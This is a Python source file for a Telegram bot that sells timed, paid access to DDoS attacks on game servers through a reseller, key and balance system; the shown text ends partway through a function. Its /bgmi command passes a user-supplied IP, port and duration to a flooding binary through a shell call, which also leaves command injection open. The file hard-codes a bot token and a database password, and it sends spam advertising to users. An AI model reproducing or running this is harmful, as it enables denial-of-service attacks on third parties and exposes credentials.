from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
from datetime import datetime, timedelta
import subprocess
import time  # Import time for sleep functionalit
import asyncio
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from pymongo import MongoClient
import random 
import string
from telegram.ext import CallbackQueryHandler
from telegram.ext import MessageHandler, filters

# Bot token
BOT_TOKEN = '7960283920:AAF3cS48v-urzoXsjhgNPj27Rp8w1qEfuLc'  # Replace with your bot token

# Admin ID
ADMIN_ID = 1944182800

# Admin information
ADMIN_USERNAME = "❄️DAKU BHAIZ❄️"
ADMIN_CONTACT = "@DAKUxBHAIZ"

# MongoDB Connection
MONGO_URL = "mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv"
client = MongoClient(MONGO_URL)

# Database and Collection
db = client["dakufree"]  # Database name
collection = db["Users"]  # Collection name
key_collection = db["Keys"]  # Collection for storing keys

# Dictionary to track recent attacks with a cooldown period
recent_attacks = {}

# Cooldown period in seconds
COOLDOWN_PERIOD = 1

async def approve(update: Update, context: CallbackContext):
    admin = collection.find_one({"user_id": update.effective_user.id})
    
    # Check if the user is the Super Admin or a normal admin
    if update.effective_user.id != ADMIN_ID and (not admin or not admin.get("is_admin", False)):
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])  # ID of the user to approve
        duration = context.args[1]  # Duration with a unit (e.g., 1m, 2h, 3d)

        # Parse the duration
        duration_value = int(duration[:-1])  # Numeric part
        duration_unit = duration[-1].lower()  # Unit part (m = minutes, h = hours, d = days)

        # Calculate expiration time
        if duration_unit == "m":  # Minutes
            expiration_date = datetime.now() + timedelta(minutes=duration_value)
        elif duration_unit == "h":  # Hours
            expiration_date = datetime.now() + timedelta(hours=duration_value)
        elif duration_unit == "d":  # Days
            expiration_date = datetime.now() + timedelta(days=duration_value)
        else:
            await update.message.reply_text(
                "❌ *Invalid duration format. Use `m` for minutes, `h` for hours, or `d` for days.*",
                parse_mode="Markdown"
            )
            return

        # Super Admin logic: No balance deduction
        if update.effective_user.id == ADMIN_ID:
            collection.update_one(
                {"user_id": user_id},
                {"$set": {"user_id": user_id, "expiration_date": expiration_date}},
                upsert=True
            )
            await update.message.reply_text(
                f"✅ *User {user_id} approved by Super Admin for {duration_value} "
                f"{'minute' if duration_unit == 'm' else 'hour' if duration_unit == 'h' else 'day'}(s).* \n"
                f"⏳ *Access expires on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode="Markdown"
            )

            # Notify approved user
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=(
                        f"🎉 *Congratulations!*\n"
                        f"✅ You have been approved for {duration_value} "
                        f"{'minute(s)' if duration_unit == 'm' else 'hour(s)' if duration_unit == 'h' else 'day(s)'}.\n"
                        f"⏳ *Your access will expire on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}.\n"
                        f"🚀 Enjoy using the bot!"
                    ),
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"Error notifying approved user {user_id}: {e}")
            return

        # Balance deduction for normal admins
        pricing = {
            1: 75,  # 1 day = ₹75
            3: 195,  # 3 days = ₹195
            7: 395,  # 7 days = ₹395
            30: 715  # 30 days = ₹715
        }
        price = pricing.get(duration_value) if duration_unit == "d" else None  # Pricing only applies for days

        if price is None:
            await update.message.reply_text(
                "❌ *Normal admins can only approve for fixed durations: 1, 3, 7, 30 days.*",
                parse_mode="Markdown"
            )
            return

        admin_balance = admin.get("balance", 0)
        if admin_balance < price:
            await update.message.reply_text("❌ *Insufficient balance to approve this user.*", parse_mode="Markdown")
            return

        # Deduct balance for normal admin
        collection.update_one(
            {"user_id": update.effective_user.id},
            {"$inc": {"balance": -price}}
        )

        # Approve the user
        collection.update_one(
            {"user_id": user_id},
            {"$set": {"user_id": user_id, "expiration_date": expiration_date}},
            upsert=True
        )

        await update.message.reply_text(
            f"✅ *User {user_id} approved for {duration_value} days by Admin.*\n"
            f"💳 *₹{price} deducted from your balance.*\n"
            f"⏳ *Access expires on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode="Markdown"
        )

        # Notify approved user
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=(
                    f"🎉 *Congratulations!*\n"
                    f"✅ You have been approved for {duration_value} days.\n"
                    f"⏳ *Your access will expire on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}.\n"
                    f"🚀 Enjoy using the bot!"
                ),
                parse_mode="Markdown"
            )
        except Exception as e:
            print(f"Error notifying approved user {user_id}: {e}")

    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /approve <user_id> <duration>*\n\n"
            "Example durations:\n\n"
            "1 Days = ₹75\n"
            "3 Days = ₹195\n"
            "7 Days = ₹395\n"
            "30 Days = ₹715\n",
            parse_mode="Markdown"
        )

from datetime import datetime, timedelta

async def notify_expiring_users(bot):
    while True:
        try:
            now = datetime.now()
            # Find users whose expiration is exactly 10 seconds from now
            expiring_soon_users = collection.find({
                "expiration_date": {"$gte": now, "$lte": now + timedelta(seconds=10)}
            })

            for user in expiring_soon_users:
                user_id = user.get("user_id")
                expiration_date = user.get("expiration_date")

                print(f"Notifying user {user_id} about expiration at {expiration_date}")  # Debug log

                try:
                    # Notify the user about their upcoming expiration
                    await bot.send_message(
                        chat_id=user_id,
                        text=(
                            "⚠️ *Your access is about to expire in 10 seconds!*\n"
                            "🔑 Please renew your access to continue using the bot."
                        ),
                        parse_mode="Markdown"
                    )
                    print(f"Notification sent to user {user_id}")  # Log success
                except Exception as e:
                    print(f"Error notifying user {user_id}: {e}")  # Log errors

        except Exception as main_error:
            print(f"Error in notify_expiring_users: {main_error}")

        await asyncio.sleep(5)  # Check every 5 seconds
        
# Remove a user from MongoDB
async def remove(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode='Markdown')
        return

    try:
        user_id = int(context.args[0])

        # Remove user from MongoDB
        result = collection.delete_one({"user_id": user_id})

        if result.deleted_count > 0:
            await update.message.reply_text(f"❌ *User {user_id} has been removed from the approved list.*", parse_mode='Markdown')
        else:
            await update.message.reply_text("🚫 *User not found in the approved list.*", parse_mode='Markdown')
    except IndexError:
        await update.message.reply_text("❌ *Usage: /remove <user_id>*", parse_mode='Markdown')

# Notifications List
notifications = [
    "🎉 *Exclusive Offer! Limited Time Only!*\n\n💫 *DAKU BHAIZ ka bot ab working hai!* \n🔥 Get it now and enjoy premium features at the best price.\n\n📩 Contact @DAKUxBHAIZ to purchase the bot today!",
    "🚀 *100% Working Bot Available Now!*\n\n✨ Ab gaming aur tools ka maza lo bina kisi rukawat ke! \n💵 Affordable prices aur limited-time offers!\n\n👻 *Contact the owner now:* @DAKUxBHAIZ",
    "🔥 *Grab the Deal Now!* 🔥\n\n💎 DAKU BHAIZ ke bot ka fayda uthaiye! \n✅ Full support, trusted service, aur unbeatable offers!\n\n👉 Message karo abhi: @DAKUxBHAIZ",
    "🎁 *Offer Alert!*\n\n🚀 Bot by DAKU BHAIZ is now live and ready for purchase! \n💸 Limited-period deal hai, toh der na karein.\n\n📬 DM karo abhi: @DAKUxBHAIZ",
    "🌟 *Trusted Bot by DAKU BHAIZ* 🌟\n\n🎯 Working, trusted, aur power-packed bot ab available hai! \n✨ Features ka maza lo aur apna kaam easy banao.\n\n📞 DM for details: @DAKUxBHAIZ",
]

# Function to check if a user is approved
def is_user_approved(user_id):
    user = collection.find_one({"user_id": user_id})
    if user:
        expiration_date = user.get("expiration_date")
        if expiration_date and datetime.now() < expiration_date:
            return True
    return False

# Notify unapproved users daily
async def notify_unapproved_users(bot):
    while True:
        try:
            # Fetch all users from the database
            all_users = collection.find()

            for user in all_users:
                user_id = user.get("user_id")
                if not is_user_approved(user_id):  # Only notify unapproved users
                    notification = random.choice(notifications)  # Select a random notification
                    try:
                        await bot.send_message(
                            chat_id=user_id,
                            text=notification,
                            parse_mode="Markdown"
                        )
                        print(f"Notification sent to unapproved user {user_id}")
                    except Exception as e:
                        print(f"Error sending notification to user {user_id}: {e}")

            # Wait for 24 hours before sending the next notification
            await asyncio.sleep(24 * 60 * 60)

        except Exception as e:
            print(f"Error in notify_unapproved_users: {e}")
            await asyncio.sleep(60)  # Retry after 1 minute if there is an error

# Function to add spaced buttons to messages
def get_default_buttons():
    keyboard = [
        [InlineKeyboardButton("💖 JOIN OUR CHANNEL 💖", url="https://t.me/DAKUxBHAI")],
        [InlineKeyboardButton("👻 CONTACT OWNER 👻", url="https://t.me/DAKUxBHAIZ")]
    ]
    return InlineKeyboardMarkup(keyboard)
    
async def addadmin(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])
        balance = int(context.args[1])

        # Add admin privileges and balance
        collection.update_one(
            {"user_id": user_id},
            {"$set": {"is_admin": True, "balance": balance}},
            upsert=True
        )

        await update.message.reply_text(
            f"✅ *User {user_id} is now an admin with ₹{balance} balance.*", parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /addadmin <user_id> <balance>*",
            parse_mode="Markdown"
        )
        
async def addbalance(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])
        amount = int(context.args[1])

        # Add balance to the admin's account
        collection.update_one(
            {"user_id": user_id},
            {"$inc": {"balance": amount}}
        )

        await update.message.reply_text(
            f"✅ *₹{amount} added to Admin {user_id}'s balance.*", parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /addbalance <user_id> <amount>*",
            parse_mode="Markdown"
        )
        
async def adminbalance(update: Update, context: CallbackContext):
    admin = collection.find_one({"user_id": update.effective_user.id})
    if not admin or not admin.get("is_admin", False):
        await update.message.reply_text("🚫 *You are not an admin.*", parse_mode="Markdown")
        return

    balance = admin.get("balance", 0)
    await update.message.reply_text(f"💳 *Admin current balance is ₹{balance}.*", parse_mode="Markdown")

# Command Handlers
async def start(update: Update, context: CallbackContext):
    user = update.effective_user
    welcome_message = (
        f"👋 *Hello, {user.first_name}!*\n\n"
        "✨ *Welcome to the bot.*\n"
        "📜 *Type /help to see available commands.*\n\n"
        "💫 The owner of this bot is ❄️DAKU BHAIZ❄️. Contact @DAKUxBHAIZ."
    )
    await update.message.reply_text(welcome_message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    user = update.effective_user
    user_data = collection.find_one({"user_id": user.id})
    if user.id == ADMIN_ID:
        help_message = (
            "📜 *Super Admin Commands:*\n\n"
            "/approve - Approve users\n"
            "/addadmin - Add a reseller\n"
            "/addbalance - Add balance to an admin\n"
            "/remove - Remove a user\n"
            "/genkey - Generate keys\n"
            "/redeem - Redeem keys\n"
            "/adminbalance - Check balance\n"
            "/bgmi - Start attack\n"
            "/settime - Set attack time limit\n"
            "/setthread - Change thread settings\n"
            "/price - View prices\n"
            "/rule - View rules\n"
            "/owner - Contact owner\n"
            "/myinfo - View your info\n"
            "/removecoin - Remove coin\n"
            "/removeadmin - Remove admin\n"
            "/broadcast - Send Massage\n"
            "/users - See Users\n"
        )
    elif user_data and user_data.get("is_admin"):
        help_message = (
            "📜 *Admin Commands:*\n\n"
            "/genkey - Generate keys\n"
            "/redeem - Redeem keys\n"
            "/bgmi - Start attack\n"
            "/adminbalance - Check your balance\n"
            "/help - View commands\n"
        )
    else:
        help_message = (
            "📜 *User Commands:*\n\n"
            "/bgmi - Start attack\n"
            "/price - View prices\n"
            "/rule - View rules\n"
            "/owner - Contact owner\n"
            "/myinfo - View your info\n"
            "/redeem - Redeem key\n"
            "/howtoattack - How To Attack\n"
            "/canary - Download Canary Android & Ios\n\n"
            "*USE COMMAND* /buy *FOR BUY DDOS BOT*\n"
        )

    await update.message.reply_text(help_message, parse_mode="Markdown")
    
async def gen(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    admin_data = collection.find_one({"user_id": user_id})
    
    # ✅ Super Admin check
    is_super_admin = user_id == ADMIN_ID

    # ✅ Normal Admin check
    if not is_super_admin and (not admin_data or not admin_data.get("is_admin")):
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        # ✅ Command format: /gen <duration> <max_uses>
        duration_input = context.args[0]  # e.g., "30m", "2h", "7d"
        max_uses = int(context.args[1])  # Max number of users who can use the key

        # ✅ Validate duration format
        duration_value = int(duration_input[:-1])  
        duration_unit = duration_input[-1].lower()

        if not is_super_admin and duration_unit != "d":  # Normal Admins can only generate in days
            await update.message.reply_text(
                "❌ *Normal admins can only generate keys for fixed days: 1, 3, 7, 30.*",
                parse_mode="Markdown"
            )
            return

        # ✅ Convert duration to seconds
        duration_seconds = {
            "m": duration_value * 60,
            "h": duration_value * 3600,
            "d": duration_value * 86400
        }.get(duration_unit)

        if duration_seconds is None:
            await update.message.reply_text("❌ *Invalid duration format. Use `m`, `h`, or `d`.*", parse_mode="Markdown")
            return

        # ✅ Pricing logic for Normal Admin
        pricing = {1: 75, 3: 195, 7: 395, 30: 715}
        price = pricing.get(duration_value) if duration_unit == "d" else None

        if not is_super_admin:
            if price is None:
                await update.message.reply_text("❌ *Invalid duration. Choose from: 1, 3, 7, 30 days.*", parse_mode="Markdown")
                return

            balance = admin_data.get("balance", 0)
            total_price = price * max_uses  # Price per user * number of users

            if balance < total_price:
                await update.message.reply_text(
                    f"❌ *Insufficient balance!*\n💳 Current Balance: ₹{balance}\n💰 Required: ₹{total_price}",
                    parse_mode="Markdown"
                )
                return

            # ✅ Deduct balance
            collection.update_one({"user_id": user_id}, {"$inc": {"balance": -total_price}})
        
        # ✅ Generate random key
        key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

        # ✅ Save key to database with max_uses
        key_collection.insert_one({
            "key": key,
            "duration_seconds": duration_seconds,
            "generated_by": user_id,
            "is_redeemed": False,
            "max_uses": max_uses,  # ✅ How many users can redeem this key
            "redeemed_by": []  # ✅ List of user IDs who used this key
        })

        await update.message.reply_text(
            f"✅ *Key Generated Successfully!*\n🔑 Key: `{key}`\n"
            f"⏳ Validity: {duration_value} {'minute(s)' if duration_unit == 'm' else 'hour(s)' if duration_unit == 'h' else 'day(s)'}\n"
            f"👥 Usable by: {max_uses} users\n"
            f"💳 Cost: ₹{total_price if not is_super_admin else 'Free'}",
            parse_mode="Markdown"
        )

    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /gen <duration> <max_uses>*\n\n"
            "📑Examples:\n"
            "`/gen 1d 5` (1 day key for 5 users)\n"
            "`/gen 3d 10` (3 days key for 10 users)",
            parse_mode="Markdown"
        )
        
async def redeem(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    try:
        key = context.args[0]  # Key to redeem
        key_data = key_collection.find_one({"key": key, "is_redeemed": False})

        if not key_data:
            await update.message.reply_text("❌ *Invalid or already expired key.*", parse_mode="Markdown")
            return

        # ✅ Check if key limit is reached
        max_uses = key_data.get("max_uses", 1)
        redeemed_by = key_data.get("redeemed_by", [])

        if user_id in redeemed_by:
            await update.message.reply_text("⚠️ *You have already used this key!*", parse_mode="Markdown")
            return

        if len(redeemed_by) >= max_uses:
            await update.message.reply_text("❌ *Key redemption limit reached!*", parse_mode="Markdown")
            return

        # ✅ Calculate expiration date
        duration_seconds = key_data["duration_seconds"]
        expiration_date = datetime.now() + timedelta(seconds=duration_seconds)

        # ✅ Update user expiration date
        collection.update_one(
            {"user_id": user_id},
            {"$set": {"user_id": user_id, "expiration_date": expiration_date}},
            upsert=True
        )

        # ✅ Add user to redeemed list
        key_collection.update_one({"key": key}, {"$push": {"redeemed_by": user_id}})

        # ✅ If all slots are used, mark key as redeemed
        if len(redeemed_by) + 1 >= max_uses:
            key_collection.update_one({"key": key}, {"$set": {"is_redeemed": True}})

        await update.message.reply_text(
            f"✅ *Key Redeemed Successfully!*\n🔑 Key: `{key}`\n"
            f"⏳ Access Expires: {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"👥 Remaining uses: {max_uses - len(redeemed_by) - 1}",
            parse_mode="Markdown"
        )

    except IndexError:
        await update.message.reply_text(
            "❌ *Usage: /redeem <key>*",
            parse_mode="Markdown"
        )
        
async def removeadmin(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])

        # Remove admin privileges
        collection.update_one(
            {"user_id": user_id},
            {"$unset": {"is_admin": "", "balance": ""}}
        )

        await update.message.reply_text(
            f"✅ *User {user_id} is no longer an admin.*", parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /removeadmin <user_id>*",
            parse_mode="Markdown"
        )
        
async def removecoin(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])
        amount = int(context.args[1])

        # Deduct balance
        admin_data = collection.find_one({"user_id": user_id})
        if not admin_data or not admin_data.get("is_admin", False):
            await update.message.reply_text(
                "❌ *The specified user is not an admin.*", parse_mode="Markdown"
            )
            return

        current_balance = admin_data.get("balance", 0)
        if current_balance < amount:
            await update.message.reply_text(
                "❌ *Insufficient balance to deduct.*", parse_mode="Markdown"
            )
            return

        collection.update_one(
            {"user_id": user_id},
            {"$inc": {"balance": -amount}}
        )

        await update.message.reply_text(
            f"✅ *₹{amount} deducted from Admin {user_id}'s balance.*",
            parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /removecoin <user_id> <amount>*",
            parse_mode="Markdown"
        )

from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from datetime import datetime, timedelta
import asyncio
import subprocess

# Admin ID & Channel Details
ADMIN_ID = 1944182800  
FEEDBACK_CHANNEL = "@feedbackchanneldaku"
CHANNEL_USERNAME = "@DAKUxBHAI"
CHANNEL_LINK = "https://t.me/DAKUxBHAI"

async def set_attack_limit(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        new_limit = int(context.args[0])  # New attack limit in seconds
        if new_limit < 1:
            await update.message.reply_text("⚠️ *Invalid limit. Please enter a value greater than 0.*", parse_mode="Markdown")
            return
        global attack_time_limit
        attack_time_limit = new_limit  # Update global attack time limit
        await update.message.reply_text(f"✅ *Attack time limit has been updated to {new_limit} seconds.*", parse_mode="Markdown")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ *Usage: /setattacklimit <duration_in_seconds>*", parse_mode="Markdown")

# Attack Settings
current_attack_user = None  
current_attack_end_time = None  
attack_time_limit = 300
attack_cooldown = {}  
COOLDOWN_PERIOD = 1  
user_feedback_required = {}  
user_bans = {}  
BAN_DURATION = timedelta(minutes=5)  
user_attack_count = {}  # {user_id: (date, count)}
ATTACK_LIMIT = 200  # Ek din me max attack limit
bot_maintenance = False  # Bot maintenance state
user_last_photo = {}  # {user_id: last_photo_id}

# ✅ Check if User is in Channel
async def is_user_in_channel(user_id, bot):
    try:
        chat_member = await bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return chat_member.status in ["member", "administrator", "creator"]
    except:
        return False

# ✅ Channel Join Button
async def join_channel(update: Update, context):
    user_id = update.effective_user.id

    if await is_user_in_channel(user_id, context.bot):
        await update.callback_query.message.edit_text("✅ *You have joined the channel! Now you can use the bot.*", parse_mode="Markdown")
    else:
        await update.callback_query.answer("🚫 You haven't joined the channel yet!", show_alert=True)

# ✅ Attack Command with Channel Check & Button
async def bgmi(update: Update, context: CallbackContext):
    global current_attack_user, current_attack_end_time

    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    now = datetime.now()

    # ✅ Bot Maintenance Check
    if bot_maintenance:
        await update.message.reply_text("⚠️ *Bot is under maintenance. Try again later!*", parse_mode="Markdown")
        return

    # ✅ Pehle Check Karo Ki User Channel Join Kiya Ya Nahi
    if not await is_user_in_channel(user_id, context.bot):
        keyboard = [[InlineKeyboardButton("💖 Join Channel 💖", url=CHANNEL_LINK)],
                    [InlineKeyboardButton("✅ I Have Joined", callback_data="join_check")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "🚫 *You must join our channel before using this command!*\n"
            f"🔗 *Join here:* [Click Here]({CHANNEL_LINK})",
            parse_mode="Markdown", reply_markup=reply_markup
        )
        return

    # ✅ Agar user banned hai aur abhi tak ban period khatam nahi hua
    if user_id in user_bans and now < user_bans[user_id]:
        remaining_time = (user_bans[user_id] - now).total_seconds()
        minutes, seconds = divmod(remaining_time, 60)
        await update.message.reply_text(
            f"⚠️ 𝘼𝙖𝙥 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙣𝙖𝙝𝙞 𝙙𝙞𝙮𝙚, {int(minutes)} min {int(seconds)} 𝙨𝙚𝙘 𝙩𝙖𝙠 𝙗𝙖𝙣 𝙝𝙖𝙞𝙣!",
            parse_mode="Markdown"
        )
        return

    # ✅ Daily Attack Limit Check
    if user_id in user_attack_count:
        last_attack_date, attack_count = user_attack_count[user_id]
        if last_attack_date.date() == now.date():  
            if attack_count >= ATTACK_LIMIT:
                await update.message.reply_text("⚠️ *You have reached your daily attack limit!*", parse_mode="Markdown")
                return
        else:
            user_attack_count[user_id] = (now, 0)  # Reset count if new day
    else:
        user_attack_count[user_id] = (now, 0)  # First attack of the day

    # ✅ Agar user ko feedback dena tha aur usne nahi diya, toh ab ban lagao
    if user_feedback_required.get(user_id, False):
        user_bans[user_id] = now + BAN_DURATION  # 2 Hour Ban
        del user_feedback_required[user_id]  
        await update.message.reply_text("🚫 𝗔𝗮𝗽 𝗳𝗲𝗲𝗱𝗯𝗮𝗰𝗸 𝗻𝗮𝗵𝗶 𝗱𝗶𝘆𝗲, 5 𝗺𝗶𝗻 𝗸𝗲 𝗹𝗶𝘆𝗲 𝗯𝗮𝗻 𝗵𝗼 𝗴𝗮𝘆𝗲!")
        return

    # ✅ Agar ek attack already chal raha hai
    if current_attack_user is not None:
        remaining_time = (current_attack_end_time - datetime.now()).total_seconds()
        if remaining_time > 0:
            await update.message.reply_text(
                f"⚠️ *Another attack is currently in progress!*\n"
                f"👤 *Attacking User ID:* {current_attack_user}\n"
                f"⏳ *Remaining Time:* {int(remaining_time)} seconds.\n\n"
                "🚀 Please wait for the current attack to finish.",
                parse_mode="Markdown",
            )
            return
        else:
            current_attack_user = None
            current_attack_end_time = None

    # ✅ Normal attack validation
    if not is_user_approved(user_id):
        await update.message.reply_text(
            "🚫 *You are not authorized to use this command.*\n"
            "💬 *Please contact the admin if you believe this is an error.*",
            parse_mode="Markdown",
        )
        return

    if len(context.args) != 3:
        await update.message.reply_text("⚠️ *Usage:* /bgmi <ip> <port> <duration>", parse_mode="Markdown")
        return

    ip, port, time_duration = context.args[0], context.args[1], int(context.args[2])

    if time_duration > attack_time_limit:
        await update.message.reply_text(f"⚠️ *You cannot attack for more than {attack_time_limit} seconds.*", parse_mode="Markdown")
        return

    # ✅ Set current attack user
    current_attack_user = user_id
    current_attack_end_time = now + timedelta(seconds=time_duration)

    await update.message.reply_text(
        f"🚀 *ATTACK STARTED*\n"
        f"🌐 *IP:* {ip}\n"
        f"🎯 *PORT:* {port}\n"
        f"⏳ *DURATION:* {time_duration} seconds\n"
        f"👤 *User:* {user_name} (ID: {user_id})\n\n"
        "⚠️ *After attack, send feedback photo, otherwise you will be banned!*",
        parse_mode="Markdown",
    )

    asyncio.create_task(run_attack(ip, port, time_duration, update, user_id))
    
async def run_attack(ip, port, time_duration, update, user_id):
    global current_attack_user, current_attack_end_time, attack_cooldown

    try:
        command = f"./daku {ip} {port} {time_duration} {15} {default_thread}"
        process = subprocess.Popen(command, shell=True)

        await asyncio.sleep(time_duration)

        process.terminate()
        process.wait()

        # Reset attack state
        current_attack_user = None
        current_attack_end_time = None

        # Send attack finished message
        await update.message.reply_text(
            f"✅ *ATTACK FINISHED*\n"
            f"🌐 *IP:* {ip}\n"
            f"🎯 *PORT:* {port}\n"
            f"⏳ *DURATION:* {time_duration} seconds\n"
            f"👤 *User ID:* {user_id}\n\n"
            "💫 The owner of this bot is ❄️DAKU BHAIZ❄️. Contact @DAKUxBHAIZ.",
            parse_mode="Markdown",
        )

    except Exception as e:
        print(f"Error in run_attack: {e}")
        await update.message.reply_text(f"⚠️ *Attack Error:* {str(e)}", parse_mode="Markdown")

# ✅ Feedback Handling & Duplicate Photo Ban
async def handle_photo(update: Update, context: CallbackContext):
    global user_feedback_required, user_bans, user_last_photo

    user_id = update.effective_user.id
    photo_id = update.message.photo[-1].file_id

    # ✅ Duplicate Photo Check
    if user_last_photo.get(user_id) == photo_id:
        user_bans[user_id] = datetime.now() + BAN_DURATION
        await update.message.reply_text("🚫 *Same photo detected twice! You are banned for 20 Minutes!*", parse_mode="Markdown")
        return

    user_last_photo[user_id] = photo_id  

    await context.bot.forward_message(ADMIN_ID, update.message.chat_id, update.message.message_id)
    await context.bot.forward_message(FEEDBACK_CHANNEL, update.message.chat_id, update.message.message_id)

    if user_feedback_required.get(user_id, False):
        user_feedback_required[user_id] = False  
        await update.message.reply_text("✅ *Feedback received! You can attack again.*", parse_mode="Markdown")

# ✅ Enable/Disable Bot Maintenance Mode
async def maintenance_mode(update: Update, context: CallbackContext):
    global bot_maintenance

    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    command = context.args[0].lower() if context.args else ""
    bot_maintenance = False if command == "on" else True
    await update.message.reply_text(f"✅ *Bot maintenance mode {'Disabled' if command == 'on' else 'Enabled'}!*", parse_mode="Markdown")
            
async def clear_attack(update: Update, context: CallbackContext):
    global current_attack_user, current_attack_end_time, current_attack_process

    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    if current_attack_user is None:
        await update.message.reply_text("⚠️ *No active attack to clear.*", parse_mode="Markdown")
        return

    # Kill the running attack process
    if current_attack_process:
        current_attack_process.terminate()
        current_attack_process.wait()
        current_attack_process = None  # Reset process tracking

    # Reset attack tracking variables
    current_attack_user = None
    current_attack_end_time = None

    await update.message.reply_text("✅ *Attack has been forcefully stopped by the admin.*", parse_mode="Markdown")
    
# Default thread value
default_thread = "1000"

# Command to set thread dynamically
async def set_thread(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        global default_thread
        new_thread = context.args[0]
        if not new_thread.isdigit():
            await update.message.reply_text("❌ *Invalid thread value. Please provide a numeric value.*", parse_mode="Markdown")
            return

        default_thread = new_thread  # Update the default thread value
        await update.message.reply_text(f"✅ *Thread value updated to {default_thread}.*", parse_mode="Markdown")
    except IndexError:
        await update.message.reply_text("❌ *Usage: /setthread <thread_value>*", parse_mode="Markdown")

# Command for /howtoattack
async def howtoattack(update: Update, context: CallbackContext):
    await update.message.reply_text(
        "📖 *Learn How to Attack:*\n"
        f"[Watch the Tutorial](https://youtu.be/gcc-iovADq4?si=teEuoQLRGNQK6MxZ)",
        parse_mode="Markdown"
    )

# Command for /canary
async def canary(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("📱Android Canary📱", url="https://t.me/DAKUBHAIZ/143")],
        [InlineKeyboardButton("🍎iOS Canary🍎", url="https://apps.apple.com/in/app/surge-5/id1442620678")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🛠️ *Choose your platform to download the Canary version:*",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )
            
async def price(update: Update, context: CallbackContext):
    price_message = (
        "💰 *PRICE LIST:*\n\n"
        "⭐ 1 Day = ₹115\n"
        "⭐ 3 Days = ₹295\n"
        "⭐ 1 Week = ₹525\n"
        "⭐ 1 Month = ₹995\n"
        "⭐ Lifetime = ₹1,585\n\n"
        "💫 The owner of this bot is ❄️DAKU BHAIZ❄️. Contact @DAKUxBHAIZ."
    )
    await update.message.reply_text(price_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def rule(update: Update, context: CallbackContext):
    rule_message = "⚠️ *Rule: Ek Time Pe Ek Hi Attack Lagana*\n\n💫 The owner of this bot is ❄️DAKU BHAIZ❄️. Contact @DAKUxBHAIZ."
    await update.message.reply_text(rule_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def owner(update: Update, context: CallbackContext):
    await update.message.reply_text(
        f"👤 *The owner of this bot is {ADMIN_USERNAME}.*\n"
        f"✉️ *Contact:* {ADMIN_CONTACT}\n\n", parse_mode='Markdown'
    )

async def myinfo(update: Update, context: CallbackContext):
    user = update.effective_user
    user_data = collection.find_one({"user_id": user.id})
    now = datetime.now()

    # Check if the user is approved
    if user_data and "expiration_date" in user_data:
        expiration_date = user_data["expiration_date"]

        # Convert expiration date to IST
        ist_expiration = expiration_date + timedelta(hours=5, minutes=30)
        
        # Check if the expiration date is in the past
        if expiration_date < now:
            expiration_info = (
                f"❌ *Your access has expired.*\n"
                f"⏳ *Expired On:* {ist_expiration.strftime('%Y-%m-%d %H:%M:%S')}"
            )
        else:
            # Calculate time left based on IST
            ist_now = now + timedelta(hours=5, minutes=30)
            time_left = ist_expiration - ist_now
